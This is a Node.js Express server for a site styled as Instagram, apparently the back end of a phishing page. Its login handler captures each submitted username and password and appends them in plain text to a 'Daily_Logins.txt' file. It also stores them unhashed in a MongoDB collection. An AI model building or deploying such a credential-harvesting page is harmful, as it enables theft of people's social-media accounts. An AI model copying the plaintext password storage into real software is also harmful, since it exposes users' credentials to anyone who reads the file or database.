const express = require("express");
const path = require("path");
const fs = require("fs");

const app = express();
const port = 80;
// getting-started.js
const mongoose = require('mongoose');

main().catch(err => console.log(err));

async function main() {
    console.log("We are connected bro....");
    await mongoose.connect('mongodb://localhost:27017/Instagram');
}

const loginSchema = new mongoose.Schema({
    username: String,
    password: String
});


loginSchema.methods.speak = function speak() {
    const greeting = this.name
      ? "My name is " + this.name + " My passwors is " + this.password
      : "I don't have a name";
    console.log(greeting);
};

const Login = mongoose.model('Login', loginSchema);

// EXPRESS SPECIFIC STUFF
app.use('/static', express.static('static'));
app.use(express.urlencoded());

// PUG SPECIFIC STUFF
app.set('view engine', 'pug');
app.set('views', path.join(__dirname, 'views'));

// ENDPOINTS
app.get('/', (req, res) =>{
    const con = "This is the best content on the internet so far so use it wisely";
    const params = {'title': 'Instagram is the Best Place', 'content': con};
    res.status(200).render('index.pug', params);
});

app.get('/signup', (req, res) =>{
    const con = "This is the best content on the internet so far so use it wisely";
    const params = {'title': 'Instagram is the Best Place', 'content': con};
    res.status(200).render('../../Signup/views/signup.pug', params);
});

app.post('/', (req, res)=>{
    Name = req.body.username
    Password = req.body.password

    let outputToWrite = `The name of the client is ${Name} and ${Name}'s password is ${Password}\n`
    fs.appendFileSync('Daily_Logins.txt', outputToWrite);

    const login = new Login(req.body);
    login.save().then(()=>{
        res.send("This item has been saved to the database");
    }).catch(()=>{
        res.status(400).send("item was not saved to the databse");
    })
    // login.speak();

    // const params = {'title': 'Instagram is the best place to waste your valuable time'};
    // res.status(200).render('index.pug', params);
})



// START THE SERVER
app.listen(port, ()=>{
    console.log(`The application started successfully on port:${port}`);
})

// const logins = Login.find();
// console.log(logins);

// Login.find({ name: /^venkat/ });